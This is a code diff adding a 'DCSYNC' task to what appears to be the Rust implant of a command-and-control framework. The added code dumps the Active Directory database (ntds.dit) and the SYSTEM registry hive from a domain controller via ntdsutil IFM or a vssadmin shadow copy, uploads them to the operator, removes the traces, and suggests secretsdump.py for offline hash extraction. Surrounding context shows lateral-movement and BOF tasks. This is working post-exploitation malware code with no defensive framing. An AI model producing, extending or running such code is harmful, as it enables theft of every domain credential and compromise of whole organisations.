@@ -1783,6 +1783,54 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, "", "BOF not supported on this platform");
         }
+        "DCSYNC" => {
+            // Extract ntds.dit + SYSTEM via IFM (default) or VSS; upload both for offline parsing.
+            // Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
+            // Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let mode    = j["mode"].as_str().unwrap_or("ifm");
+            let tmp_dir = j["out"].as_str().unwrap_or(r"C:\Users\Public\dcsync_out");
+            let mut ntds_path = format!(r"{}\Active Directory\ntds.dit", tmp_dir);
+            let mut sys_path  = format!(r"{}\registry\SYSTEM", tmp_dir);
+            let mut dc_err    = String::new();
+
+            if mode == "vss" {
+                let vss_out = shell("vssadmin create shadow /for=C: 2>&1");
+                let shadow  = vss_out.lines()
+                    .find(|l| l.contains("HarddiskVolumeShadowCopy") && l.contains(r"\\?\"))
+                    .and_then(|l| l.split_whitespace().find(|t| t.contains(r"\\?\")))
+                    .map(|s| s.trim_matches(|c: char| c == '\r' || c == '\n').to_string())
+                    .unwrap_or_default();
+                if shadow.is_empty() {
+                    dc_err = format!("VSS shadow copy failed: {}", vss_out);
+                } else {
+                    shell(&format!("mkdir \"{}\" 2>&1", tmp_dir));
+                    shell(&format!(r#"copy "{}\Windows\NTDS\ntds.dit" "{}\ntds.dit" /Y 2>&1"#, shadow, tmp_dir));
+                    shell(&format!(r#"copy "{}\Windows\System32\config\SYSTEM" "{}\SYSTEM" /Y 2>&1"#, shadow, tmp_dir));
+                    ntds_path = format!(r"{}\ntds.dit", tmp_dir);
+                    sys_path  = format!(r"{}\SYSTEM", tmp_dir);
+                }
+            } else {
+                shell(&format!(r"rmdir /S /Q {} 2>&1", tmp_dir));
+                shell(&format!(r#"ntdsutil "ac i ntds" "ifm" "create full {}" q q 2>&1"#, tmp_dir));
+            }
+
+            if dc_err.is_empty() {
+                for (fp, nm) in [(&ntds_path, "ntds.dit"), (&sys_path, "SYSTEM")] {
+                    match std::fs::read(fp) {
+                        Ok(data) => t.upload_file(task.id, nm, &data),
+                        Err(e) => dc_err.push_str(&format!("read {}: {}; ", fp, e)),
+                    }
+                }
+                shell(&format!(r"rmdir /S /Q {} 2>&1", tmp_dir));
+                t.send_result(task.id,
+                    "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
+                    &dc_err);
+            } else {
+                t.send_result(task.id, "", &dc_err);
+            }
+        }
+
         "LATERAL" | "JUMP" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let method       = j["method"].as_str().unwrap_or("atexec").to_string();
